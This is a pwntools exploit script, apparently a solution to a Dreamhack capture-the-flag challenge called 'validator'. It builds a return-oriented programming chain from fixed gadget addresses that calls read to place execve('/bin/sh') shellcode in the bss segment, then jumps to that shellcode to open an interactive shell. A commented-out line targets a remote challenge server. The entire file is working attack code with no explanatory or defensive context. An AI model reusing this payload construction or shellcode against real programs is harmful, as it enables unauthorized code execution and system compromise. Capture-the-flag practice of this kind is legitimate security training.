from pwn import *
r=process("./validator_dist")
#r=remote("host6.dreamhack.games",19173)
context.log_level='debug' 
ppp=0x00000000004006ea #rbx,rbp,12,13,14,15 
gadget=0x00000000004006d0 # rdx,15 rsi,14 rdi,13, ret 12 
bss=0x60106b 
read_got=0x601020 

shell=b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb0\x3b\x0f\x05'


pay=b'DREAMHACK!\x00'
for i in range(128,11,-1):
    pay+=bytes([i])
pay+=p64(0x0b0b0b0b0b0b0b0b)
pay+=p64(ppp)
pay+=p64(0)
pay+=p64(1)
pay+=p64(read_got) #r12
pay+=p64(0) #r13
pay+=p64(bss) #r14
pay+=p64(len(shell)+1) #r15
pay+=p64(gadget)
pay+=p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)
pay+=p64(bss)
pause()
r.sendline(pay)
r.sendline(shell)
r.interactive()
